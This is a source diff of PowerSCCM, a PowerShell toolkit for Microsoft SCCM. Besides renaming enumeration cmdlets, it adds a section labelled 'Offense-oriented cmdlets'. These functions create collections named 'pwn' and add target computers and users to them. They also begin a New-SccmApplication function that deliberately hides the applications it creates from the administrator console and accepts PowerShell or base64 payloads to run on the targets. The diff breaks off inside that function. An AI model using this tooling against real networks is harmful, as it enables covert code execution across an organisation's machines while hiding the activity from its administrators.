@@ -51,7 +51,7 @@ function New-SccmSession {
 
     .EXAMPLE
 
-        PS C:\> New-SccmSession -ComputerName SccmServer -SiteCode LOL
+        PS C:\> New-SccmSession -ComputerName SccmServer -SiteCode LOL -ConnectionType WMI
     
         Connect to the LOL sitecode namespace on SccmServer over WMI.    
 
@@ -80,10 +80,10 @@ function New-SccmSession {
         [ValidatePattern('^[A-Za-z]{3}$')]
         $SiteCode,
 
-        [Parameter(Position = 2)]
+        [Parameter(Position = 2, Mandatory = $True)]
         [String]
         [ValidateSet("Database", "DB", "SQL", "WMI")]
-        $ConnectionType = "SQL",
+        $ConnectionType,
 
         [Parameter(Position = 3)]
         [Management.Automation.PSCredential]
@@ -175,21 +175,24 @@ function New-SccmSession {
 
         try {
 
-            $Query = "SELECT * FROM SMS_ProviderLocation where SiteCode = '$SiteCode'"
-            if($Credential) {
-                $SccmProvider = Get-WmiObject -ComputerName $ComputerName -Query $Query -Namespace "root\sms" -Credential $Credential
-            }
-            else {
-                $SccmProvider = Get-WmiObject -ComputerName $ComputerName -Query $Query -Namespace "root\sms"
-            }
-
             $Script:SccmSessionCounter += 1
 
             $SccmSessionObject = New-Object PSObject
             $SccmSessionObject | Add-Member Noteproperty 'Id' $Script:SccmSessionCounter
             $SccmSessionObject | Add-Member Noteproperty 'Name' $($SiteCode + $Script:SccmSessionCounter)
             $SccmSessionObject | Add-Member Noteproperty 'ComputerName' $ComputerName
-            $SccmSessionObject | Add-Member Noteproperty 'Credential' $Credential
+
+
+            $Query = "SELECT * FROM SMS_ProviderLocation where SiteCode = '$SiteCode'"
+            if($PSBoundParameters['Credential']) {
+                $SccmProvider = Get-WmiObject -ComputerName $ComputerName -Query $Query -Namespace "root\sms" -Credential $Credential
+                $SccmSessionObject | Add-Member Noteproperty 'Credential' $Credential
+            }
+            else {
+                $SccmProvider = Get-WmiObject -ComputerName $ComputerName -Query $Query -Namespace "root\sms"
+                $SccmSessionObject | Add-Member Noteproperty 'Credential' $Null
+            }
+
             $SccmSessionObject | Add-Member Noteproperty 'SiteCode' $SiteCode
             $SccmSessionObject | Add-Member Noteproperty 'ConnectionType' $ConnectionType
             $SccmSessionObject | Add-Member Noteproperty 'SccmVersion' $Null
@@ -772,6 +775,28 @@ function Get-WMIQueryFilter {
 #
 ##############################################
 
+function Find-LocalSccmInfo {
+<#
+    .SYNOPSIS
+
+        Queries the local SMS_Authority Class to determine the Site Code and the Management Point
+
+    .EXAMPLE
+        PS C:\> Find-LocalSccmInfo
+
+        Gets the primary Management Point and Site code for the local host via the SMS_Authority WMI class.
+#>
+    [CmdletBinding()]
+    param()
+
+    $SmsAuthority = Get-WmiObject -Namespace "Root\CCM" -Class "SMS_Authority"
+    $SMSSiteCode = $SmsAuthority.Name.Remove(0, 4)
+    $SMSManagementServer = $SmsAuthority.CurrentManagementPoint
+
+    New-Object PSObject -Property @{'ManagementServer' = $SMSManagementServer; 'SiteCode' = $SMSSiteCode}
+}
+
+
 function Find-SccmSiteCode {
 <#
     .SYNOPSIS
@@ -780,8 +805,7 @@ function Find-SccmSiteCode {
 
     .PARAMETER ComputerName
 
-        The name key of an Sccm database to create a temporary connection to for
-        the query.
+        The Sccm server computername to enumerate.
 
     .PARAMETER ConnectionType
 
@@ -890,7 +914,7 @@ function Find-SccmSiteCode {
 }
 
 
-function Get-SccmApplicationCI {
+function Get-SccmApplication {
 <#
     .SYNOPSIS
 
@@ -967,13 +991,13 @@ function Get-SccmApplicationCI {
 
     .EXAMPLE
 
-        PS C:\> Get-SccmSession | Get-SccmApplicationCI
+        PS C:\> Get-SccmSession | Get-SccmApplication
 
         Runs the query against all current Sccm sessions.
 
     .EXAMPLE
 
-        PS C:\> Get-SccmSession | Get-SccmApplicationCI -FilterName IsHidden -FilterValue 1
+        PS C:\> Get-SccmSession | Get-SccmApplication -FilterName IsHidden -FilterValue 1
 
         Finds all hidden user deployed application configuration items.
 #>
@@ -4627,12 +4651,11 @@ FROM
 }
 
 
-function Get-SccmADComputer {
+function Get-SccmComputer {
 <#
     .SYNOPSIS
 
-        Returns information on Active Directory forests enumerated
-        by Sccm agents.
+        Finds all computers that are registered in SCCM.
 
     .PARAMETER Session
 
@@ -4653,27 +4676,19 @@ function Get-SccmADComputer {
         Switch. If -OrderBy <X> is specified, -Descending will sort the results by
         the given field in descending order.
 
+    .PARAMETER NameFilter
+
+        Any search term. Will match on that term within the computer name, wildcards accepted.
+
     .PARAMETER Filter
 
         Raw filter to build a WHERE clause. Form of "Description like '%testlab%'""
 
     .EXAMPLE
 
-        PS C:\> Get-SccmSession | Get-SccmADForest
+        PS C:\> Get-SccmSession | Get-SccmComputer -NameFilter "CORP*"
 
-        Runs the query against all current Sccm sessions.
-
-    .EXAMPLE
-
-        PS C:\> Get-SccmSession | Get-SccmADForest -DescriptionFilter "*testlab*"
-
-        Returns information on forests with 'testlab' in the description.
-
-    .EXAMPLE
-
-        PS C:\> Get-SccmSession | Get-SccmADForest -Filter "Description like '%testlab%'"
-
-        Returns information on forests with 'testlab' in the description.
+        Queries computers registered with SCCM and displays ones that match the "CORP*" filter.
 #>
     [CmdletBinding(DefaultParameterSetName = 'None')]
     param(
@@ -4695,63 +4710,7 @@ function Get-SccmADComputer {
 
         [String]
         [ValidateNotNullOrEmpty()]
-        $ResourceIDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
         $NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Distinguished_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $ActiveFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Client_VersionFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Full_Domain_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Last_Logon_TimestampFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $User_DomainFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $User_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Netbios_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Object_GUIDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Operating_System_Name_andFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Primary_Group_IDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $SIDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $User_Account_ControlFilter,
 
         [String]
         [ValidateNotNullOrEmpty()]
@@ -4764,23 +4723,28 @@ function Get-SccmADComputer {
 SELECT * FROM
 (    
     SELECT TOP $Newest
-        ResourceID,
-        Name0 as Name,
-        Distinguished_Name0 as Distinguished_Name,
-        Active0 as Active,
-        Client_Version0 as Client_Version,
-        Full_Domain_Name0 as Full_Domain_Name,
-        Last_Logon_Timestamp0 as Last_Logon_Timestamp,
-        User_Domain0 as User_Domain,
-        User_Name0 as User_Name,
-        Netbios_Name0 as Netbios_Name,
-        Object_GUID0 as Object_GUID,
-        Operating_System_Name_and0 as Operating_System_Name_and,
-        Primary_Group_ID0 as Primary_Group_ID,
-        SID0 as SID,
-        User_Account_Control0 as User_Account_Control
+        COMPUTER.ResourceID,
+        COMPUTER.Name0 as Name,
+        ADAPTER.IPAddress0 as IPAddress,
+        COMPUTER.Distinguished_Name0 as Distinguished_Name,
+        COMPUTER.Active0 as Active,
+        COMPUTER.Client_Version0 as Client_Version,
+        COMPUTER.Full_Domain_Name0 as Full_Domain_Name,
+        COMPUTER.Last_Logon_Timestamp0 as Last_Logon_Timestamp,
+        COMPUTER.User_Domain0 as User_Domain,
+        COMPUTER.User_Name0 as User_Name,
+        COMPUTER.Netbios_Name0 as Netbios_Name,
+        COMPUTER.Object_GUID0 as Object_GUID,
+        COMPUTER.Operating_System_Name_and0 as Operating_System_Name_and,
+        COMPUTER.Primary_Group_ID0 as Primary_Group_ID,
+        COMPUTER.SID0 as SID,
+        COMPUTER.User_Account_Control0 as User_Account_Control
     FROM
-         v_R_System
+         v_R_System COMPUTER
+    JOIN
+         v_GS_NETWORK_ADAPTER_CONFIGUR ADAPTER on COMPUTER.ResourceID = ADAPTER.ResourceID
+    WHERE
+         ADAPTER.IPAddress0 is not null
 )
     AS DATA
 "@
@@ -4795,431 +4759,1125 @@ SELECT * FROM
     process {
         if($Session.ConnectionType -like 'WMI') {
             if($PSBoundParameters['Newest']) {
-                Invoke-SccmQuery -Session $Session -Query $WmiQuery | Select-Object -First $Newest
+                Invoke-SccmQuery -Session $Session -Query $WmiQuery | Select-Object -First $Newest | Select-Object Name, FullDomainName, IPAddresses, LastLogonUserDomain, LastLogonUserName
             }
             else {
-                Invoke-SccmQuery -Session $Session -Query $WmiQuery
+                Invoke-SccmQuery -Session $Session -Query $WmiQuery | Select-Object Name, FullDomainName, IPAddresses, LastLogonUserDomain, LastLogonUserName
             }
         }
         else {
-            Invoke-SccmQuery -Session $Session -Query $SqlQuery
+            Invoke-SccmQuery -Session $Session -Query $SqlQuery | Select-Object Name, Full_Domain_Name, IPAddress, User_Domain, User_Name
         }
     }
 }
 
 
-function Get-SccmADUser {
+##############################################
+#
+# Offense-oriented cmdlets
+#
+##############################################
+
+function New-SccmCollection {
 <#
     .SYNOPSIS
 
-        Returns information on Active Directory users enumerated
-        by Sccm agents.
+        Create a SCCM collection to place target computers/users in for application deployment.
 
     .PARAMETER Session
 
         The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
         and retrievable with Get-SccmSession. Required. Passable on the pipeline.
 
-    .PARAMETER Newest
+    .PARAMETER CollectionName
 
-        Restrict the underlying Sccm SQL query to only return the -Newest <X> number of results.
-        Detaults to the max value of a 32-bit integer (2147483647).
+        The name would would like your collection to be called.
 
-    .PARAMETER OrderBy
+    .PARAMETER CollectionType
 
-        Order the results by a particular field.
-
-    .PARAMETER Descending
-
-        Switch. If -OrderBy <X> is specified, -Descending will sort the results by
-        the given field in descending order.
-
-    .PARAMETER Filter
-
-        Raw filter to build a WHERE clause. Form of "Description like '%testlab%'""
+        The type of collection to create, 'Device' or 'User'.
 
     .EXAMPLE
 
-        PS C:\> Get-SccmSession | Get-SccmADUser
+        PS C:\> Get-SccmSession | New-SccmCollection -CollectionName "pwn"
 
-        Runs the query against all current Sccm sessions.
-
-    .EXAMPLE
-
-        PS C:\> Get-SccmSession | Get-SccmADUser -Distinguished_Name '*will*'
-
-        Returns information on groups with 'will' in the distinguished name.
+        Creates a device collection called "pwn"
 #>
-    [CmdletBinding(DefaultParameterSetName = 'None')]
+    [CmdletBinding()]
     param(
-        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
+        [Parameter(Mandatory = $True, ValueFromPipeline=$True)]
         [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
         $Session,
 
-        [Int]
-        $Newest = [Int32]::MaxValue,
-
-        [Parameter(Mandatory=$True, ParameterSetName = 'OrderBy')]
-        [String]
-        [ValidateSet("ResourceId", "ResourceType", "CloudUserId", "Creation_Date", "Distinguished_Name", "Full_Domain_Name", "Full_User_Name", "Mail", "Name", "Network_Operating_System", "Object_GUID", "Primary_Group_ID", "SID", "Unique_User_Name", "User_Account_Control", "User_Name", "User_Principal_Name", "Windows_NT_Domain")]
-        $OrderBy,
-
-        [Parameter(ParameterSetName = 'OrderBy')]
-        [Switch]
-        $Descending,
-
         [String]
         [ValidateNotNullOrEmpty()]
-        $ResourceIdFilter,
+        $CollectionName = 'All System Objects',
 
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $User_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $User_Principal_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Distinguished_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Full_Domain_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $SIDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Primary_Group_IDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $User_Account_ControlFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Creation_DateFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $MailFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Filter
+        [ValidateSet("Device", "User")]
+        $CollectionType
     )
 
-    begin {
-
-        $SqlQuery = @"
-SELECT * FROM
-(    
-    SELECT TOP $Newest
-        ResourceID,
-        Name0 AS Name,
-        User_Name0 AS User_Name,
-        User_Principal_Name0 AS User_Principal_Name,
-        Distinguished_Name0 AS Distinguished_Name,
-        Full_User_Name0 AS Full_User_Name,
-        Full_Domain_Name0 AS Full_Domain_Name,
-        Windows_NT_Domain0 AS Windows_NT_Domain,
-        SID0 AS SID,
-        Primary_Group_ID0 AS Primary_Group_ID,
-        Unique_User_Name0 AS Unique_User_Name,
-        User_Account_Control0 AS User_Account_Control,
-        ResourceID,
-        ResourceType,
-        CloudUserId,
-        Creation_Date0 AS Creation_Date,
-        Mail0 AS Mail,
-        Network_Operating_System0 AS Network_Operating_System,
-        Object_GUID0 AS Object_GUID
-    FROM
-         v_R_User
-)
-    AS DATA
-"@
-
-        $WMIQuery = "SELECT * FROM SMS_R_User"
+    process {
         
-        # add in our filter logic
-        $SqlQuery = Get-SQLQueryFilter -Query $SqlQuery -Parameters $PSBoundParameters
-        $WMIQuery = Get-WMIQueryFilter -Query $WMIQuery -Parameters $PSBoundParameters
-    }
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
+        }
 
-    process {
-        if($Session.ConnectionType -like 'WMI') {
-            if($PSBoundParameters['Newest']) {
-                Invoke-SccmQuery -Session $Session -Query $WmiQuery | Select-Object -First $Newest
+        if($Session.Credential) {
+            if($CollectionType -eq 'Device') {
+                $LimitToCollectionID = Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Collection -Credential $Session.Credential | ?{$_.Name -eq "All Systems"} | Select-Object -Expand CollectionID
             }
             else {
-                Invoke-SccmQuery -Session $Session -Query $WmiQuery
+                $LimitToCollectionID = Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Collection -Credential $Session.Credential | ?{$_.Name -eq "All Users"} | Select-Object -Expand CollectionID
             }
+            $CollectionClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_Collection -Credential $Session.Credential
         }
         else {
-            Invoke-SccmQuery -Session $Session -Query $SqlQuery
+            if($CollectionType -eq 'Device') {
+                $LimitToCollectionID = Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Collection | ?{$_.Name -eq "All Systems"} | Select-Object -Expand CollectionID
+            }
+            else {
+                $LimitToCollectionID = Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Collection | ?{$_.Name -eq "All Users"} | Select-Object -Expand CollectionID
+            }
+            $CollectionClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_Collection
         }
+   
+        $Collection = $CollectionClass.PSBase.CreateInstance()
+        $Collection.Name = $CollectionName
+        $Collection.OwnedByThisSite = $True
+        $Collection.LimitToCollectionID = $LimitToCollectionID
+
+        if($CollectionType -eq 'Device') {
+            $Collection.CollectionType = '2'
+        }
+        else {
+            $Collection.CollectionType = '1'
+        }
+
+        Write-Verbose "Creating collection '$CollectionName'"
+
+        $Collection.PSbase.Put()
     }
 }
 
 
-function Get-SccmADGroup {
+function Remove-SccmCollection {
 <#
     .SYNOPSIS
 
-        Returns information on Active Directory group enumerated
-        by Sccm agents.
+        Deletes a SCCM collection.
 
     .PARAMETER Session
 
         The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
         and retrievable with Get-SccmSession. Required. Passable on the pipeline.
 
-    .PARAMETER Newest
+    .PARAMETER CollectionName
 
-        Restrict the underlying Sccm SQL query to only return the -Newest <X> number of results.
-        Detaults to the max value of a 32-bit integer (2147483647).
-
-    .PARAMETER OrderBy
-
-        Order the results by a particular field.
-
-    .PARAMETER Descending
-
-        Switch. If -OrderBy <X> is specified, -Descending will sort the results by
-        the given field in descending order.
-
-    .PARAMETER Filter
-
-        Raw filter to build a WHERE clause. Form of "Description like '%testlab%'""
+        The name would would like your collection to be called.
 
     .EXAMPLE
 
-        PS C:\> Get-SccmSession | Get-SccmADGroup
+        PS C:\> Get-SccmSession | Remove-SccmCollection -CollectionName "pwn"
 
-        Runs the query against all current Sccm sessions.
-
-    .EXAMPLE
-
-        PS C:\> Get-SccmSession | Get-SccmADGroup -NameFilter "*Domain Controllers*"
-
-        Returns information on groups with 'Domain Controllers' in the name.
+        Delete a device collection called "pwn"
 #>
-    [CmdletBinding(DefaultParameterSetName = 'None')]
+    [CmdletBinding()]
     param(
-        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
+        [Parameter(Mandatory = $True, ValueFromPipeline=$True)]
         [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
         $Session,
 
-        [Int]
-        $Newest = [Int32]::MaxValue,
-
-        [Parameter(Mandatory=$True, ParameterSetName = 'OrderBy')]
-        [String]
-        [ValidateSet("ResourceID", "Name", "Usergroup_Name", "AD_Domain_Name", "Windows_NT_Domain", "Full_Domain_Name", "Full_User_Name", "Mail", "Name", "Network_Operating_System", "SID", "Unique_Usergroup_Name", "ResourceID", "ResourceType", "Creation_Date", "Group_Type")]
-        $OrderBy,
-
-        [Parameter(ParameterSetName = 'OrderBy')]
-        [Switch]
-        $Descending,
-
         [String]
         [ValidateNotNullOrEmpty()]
-        $ResourceIDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Usergroup_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $AD_Domain_NameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $SIDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $ResourceTypeFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Creation_DateFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Group_TypeFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Filter
+        $CollectionName = 'All System Objects'
     )
 
-    begin {
-
-        $SqlQuery = @"
-SELECT * FROM
-(    
-    SELECT TOP $Newest
-        ResourceID,
-        Name0 AS Name,
-        Usergroup_Name0 AS Usergroup_Name,
-        AD_Domain_Name0 AS AD_Domain_Name,
-        Windows_NT_Domain0 AS Windows_NT_Domain,
-        SID0 AS SID,
-        Unique_Usergroup_Name0 AS Unique_Usergroup_Name,
-        ResourceID,
-        ResourceType,
-        Creation_Date0 AS Creation_Date,
-        Group_Type0 AS Group_Type,
-        Network_Operating_System0 AS Network_Operating_System,
-        Object_GUID0 AS Object_GUID
-    FROM
-         v_R_UserGroup
-)
-    AS DATA
-"@
-
-        $WMIQuery = "SELECT * FROM SMS_R_UserGroup"
+    process {
         
-        # add in our filter logic
-        $SqlQuery = Get-SQLQueryFilter -Query $SqlQuery -Parameters $PSBoundParameters
-        $WMIQuery = Get-WMIQueryFilter -Query $WMIQuery -Parameters $PSBoundParameters
-    }
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
+        }
 
-    process {
-        if($Session.ConnectionType -like 'WMI') {
-            if($PSBoundParameters['Newest']) {
-                Invoke-SccmQuery -Session $Session -Query $WmiQuery | Select-Object -First $Newest
-            }
-            else {
-                Invoke-SccmQuery -Session $Session -Query $WmiQuery
-            }
+        if($Session.Credential) {
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Collection -Credential $Session.Credential | Where-Object {$_.Name -like $CollectionName} | Remove-WMIObject -Credential $Session.Credential
         }
         else {
-            Invoke-SccmQuery -Session $Session -Query $SqlQuery
+            Get-WmiObject -ComputerName $Session.ComputerName -NameSpace "ROOT\SMS\site_$($Session.SiteCode)" -Class SMS_Collection | Where-Object {$_.Name -like $CollectionName} | Remove-WMIObject
         }
     }
 }
 
 
-function Get-SccmADGroupMember {
-<#
+function Add-SccmDeviceToCollection {
+ <#
     .SYNOPSIS
 
-        Returns information on Active Directory group membership enumerated
-        by Sccm agents.
+        Add a computer to a device collection for application deployment.
 
     .PARAMETER Session
 
         The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
         and retrievable with Get-SccmSession. Required. Passable on the pipeline.
 
-    .PARAMETER Newest
+    .PARAMETER ComputerNameToAdd
 
-        Restrict the underlying Sccm SQL query to only return the -Newest <X> number of results.
-        Detaults to the max value of a 32-bit integer (2147483647).
+        Computer name you would like to add to the specified collection.
 
-    .PARAMETER OrderBy
+    .PARAMETER CollectionName
 
-        Order the results by a particular field.
-
-    .PARAMETER Descending
-
-        Switch. If -OrderBy <X> is specified, -Descending will sort the results by
-        the given field in descending order.
-
-    .PARAMETER Filter
-
-        Raw filter to build a WHERE clause. Form of "Description like '%testlab%'""
+        Name of the collection you would like to add the specified computer to.
 
     .EXAMPLE
 
-        PS C:\> Get-SccmSession | Get-SccmADGroup
+        PS C:\> Get-SccmSession | Add-SccmDeviceToCollection -ComputerName "CORPWKSTNx86" -CollectionName "pwn"
 
-        Runs the query against all current Sccm sessions.
-
-    .EXAMPLE
-
-        PS C:\> Get-SccmSession | Get-SccmADGroup -NameFilter "*Domain Controllers*"
-
-        Returns information on groups with 'Domain Controllers' in the name.
+        Adds the computer "CORPWKSTNx86" to the device collection called "pwn"
 #>
-    [CmdletBinding(DefaultParameterSetName = 'None')]
+    [CmdletBinding()]
     param(
-        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline=$True)]
         [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
         $Session,
 
-        [Int]
-        $Newest = [Int32]::MaxValue,
+        [Parameter(Mandatory = $True)]
+        [String[]]
+        $ComputerNameToAdd,
 
-        [Parameter(Mandatory=$True, ParameterSetName = 'OrderBy')]
+        [Parameter(Mandatory = $True)]
         [String]
-        [ValidateSet("UserName", "GroupName", "UserResourceID")]
-        $OrderBy,
-
-        [Parameter(ParameterSetName = 'OrderBy')]
-        [Switch]
-        $Descending,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $UserNameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $GroupNameFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $UserResourceIDFilter,
-
-        [String]
-        [ValidateNotNullOrEmpty()]
-        $Filter
+        $CollectionName
     )
 
-    begin {
+    process {
 
-        $Query = @"
-SELECT * FROM
-(
-    SELECT TOP $Newest
-        G.User_Group_Name0 as GroupName,
-        U.User_Principal_Name0 as UserName,
-        G.ItemKey as UserResourceID
-    FROM
-        User_User_Group_Name_ARR G
-    JOIN 
-        v_R_User U ON G.ItemKey = U.ResourceID
-    WHERE
-        U.User_Principal_Name0 <> ''
-)
-    AS DATA
-"@
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
+        }
 
-        # add in our filter logic
-        $Query = Get-SQLQueryFilter -Query $Query -Parameters $PSBoundParameters
+        ForEach($Computer in $ComputerNameToAdd) {
+
+            if($Session.Credential) {
+                # grab the SMS_Collection WMI object
+                $SmsResourceID = $(Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Credential $Session.Credential -Query "Select * From SMS_R_System Where Name='$($ComputerNameToAdd)'").ResourceID
+                $CollectionClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Credential $Session.Credential -Class SMS_CollectionRuleDirect
+                $SmsCollection = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Credential $Session.Credential -Query "Select * From SMS_Collection Where Name='$($CollectionName)'"
+            }
+            else {
+                # grab the SMS_Collection WMI object
+                $SmsResourceID = $(Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Query "Select * From SMS_R_System Where Name='$($ComputerNameToAdd)'").ResourceID
+                $CollectionClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_CollectionRuleDirect
+                $SmsCollection = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Query "Select * From SMS_Collection Where Name='$($CollectionName)'"
+            }
+
+            # set the collection rule to be 'Computer'
+            $SmsNewRule = $CollectionClass.PSBase.CreateInstance()
+            $SmsNewRule.ResourceClassName = "SMS_R_System"
+            $SmsNewRule.ResourceID = $SmsResourceID
+            $SmsNewRule.RuleName = $Computer
+            
+            [System.Management.ManagementBaseObject[]]$SmsRules = $SmsCollection.CollectionRules
+            $SmsRules += $SmsNewRule
+            $SmsCollection.CollectionRules = $SmsRules
+            
+            Write-Verbose "Adding device '$Computer' to collection '$CollectionName'"
+
+            # Save collection
+            $SmsCollection.Put()
+        }
     }
+}
+
+
+function Add-SccmUserToCollection {
+ <#
+    .SYNOPSIS
+
+        Add a domain user to a user collection for application deployment.
+
+    .PARAMETER Session
+
+        The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
+        and retrievable with Get-SccmSession. Required. Passable on the pipeline.
+
+    .PARAMETER UserNameToAdd
+
+        User name you would like to add to the specified collection.
+
+    .PARAMETER CollectionName
+
+        Name of the collection you would like to add the specified computer to.
+
+    .EXAMPLE
+
+        PS C:\> Get-SccmSession | Add-SccmUserToCollection -UserNameToAdd "testlab\will" -CollectionName "pwn"
+
+        Adds the user "will" to the device collection called "pwn"
+#>
+    [CmdletBinding()]
+    param(
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline=$True)]
+        [ValidateScript({ $_.PSObject.TypeNames -contains 'PowerSccm.Session'})]
+        $Session,
+
+        [Parameter(Mandatory = $True)]
+        [String[]]
+        $UserNameToAdd,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        $CollectionName
+    )
 
     process {
-        if($Session.ConnectionType -like 'WMI') {
-            throw "WMI functionality for Get-SccmServiceHistory is not implemented."
+
+        if($Session.ConnectionType -notlike 'WMI') {
+            throw "SQL functionality for New-SccmCollection not yet implemented in PowerSCCM, please use a WMI connection."
         }
-        Invoke-SccmQuery -Session $Session -Query $Query
+
+        ForEach($User in $UserNameToAdd) {
+            $User = $User.Replace('/', '\')
+            $User = $User.Replace('\', '\\')
+
+            if($Session.Credential) {
+                 # grab the SMS_Collection WMI object
+                $SmsResourceID = $(Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Credential $Session.Credential -Query "Select * From SMS_R_User Where UniqueUserName='$User'").ResourceID
+                $CollectionClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Credential $Session.Credential -Class SMS_CollectionRuleDirect
+                $SmsCollection = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Credential $Session.Credential -Query "Select * From SMS_Collection Where Name='$($CollectionName)'"
+            }
+            else {
+                 # grab the SMS_Collection WMI object
+                $SmsResourceID = $(Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Query "Select * From SMS_R_User Where UniqueUserName='$User'").ResourceID
+                $CollectionClass = Get-WmiObject -List -ComputerName $Session.ComputerName -NameSpace "Root\SMS\site_$($Session.SiteCode)" -Class SMS_CollectionRuleDirect
+                $SmsCollection = Get-WmiObject -ComputerName $Session.ComputerName -Namespace "Root\Sms\Site_$($Session.SiteCode)" -Query "Select * From SMS_Collection Where Name='$($CollectionName)'"
+            }
+
+            # set the collection rule to be 'Computer'
+            $SmsNewRule = $CollectionClass.PSBase.CreateInstance()
+            $SmsNewRule.ResourceClassName = "SMS_R_User"
+            $SmsNewRule.ResourceID = $SmsResourceID
+            $SmsNewRule.RuleName = $User
+            
+            [System.Management.ManagementBaseObject[]]$SmsRules = $SmsCollection.CollectionRules
+            $SmsRules += $SmsNewRule
+            $SmsCollection.CollectionRules = $SmsRules
+            
+            Write-Verbose "Adding user '$User' to collection '$CollectionName'"
+
+            # Save collection
+            $SmsCollection.Put()
+        }
+    }
+}
+
+
+function New-SccmApplication {
+<#
+    .SYNOPSIS
+
+        Takes an application name, working directory and program/arguments & creates a
+        SCCM application via WMI. All applications are created with the "IsHidden" value set
+        in order to hide newly created applications from the Configuration Manager console.
+
+    .PARAMETER Session
+
+        The custom PowerSccm.Session object to query, generated/stored by New-SccmSession
+        and retrievable with Get-SccmSession. Required. Passable on the pipeline.
+
+    .PARAMETER ApplicationName
+
+        The name of you would like to give the new application.
+
+    .PARAMETER WorkingDirectory
+
+        Where the application will start execution from.
+
+    .PARAMETER PowerShellScript
+    
+        The text of a PowerShell script to execute for a target collection.
+        (Use $s = Get-Content .\file.ps1 | Out-String to get a script into a single stirng).
+
+    .PARAMETER PowerShellB64
+
